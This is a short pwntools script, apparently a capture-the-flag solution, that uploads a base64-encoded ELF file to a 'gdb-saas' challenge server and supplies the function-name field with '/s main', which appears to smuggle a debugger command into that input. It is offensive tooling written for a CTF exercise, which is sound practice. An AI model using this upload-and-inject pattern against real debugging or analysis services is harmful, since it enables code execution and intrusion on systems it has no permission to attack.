from pwn import *
import base64

HOST = "gdb-saas-773ca4032585.inst19.ctf.fortid.com"
PORT = 1337

elf_data = open("payload", "rb").read()
encoded = base64.b64encode(elf_data)

assert len(encoded) < 30 * 1024
base64.b64decode(encoded, validate=True)

p = remote(HOST, PORT, ssl=True)

p.sendlineafter(b"Enter ELF bytes (base64): ", encoded)
p.sendlineafter(b"Enter function name: ", b"/s main")

print(p.recvall(timeout=5).decode(errors="replace"))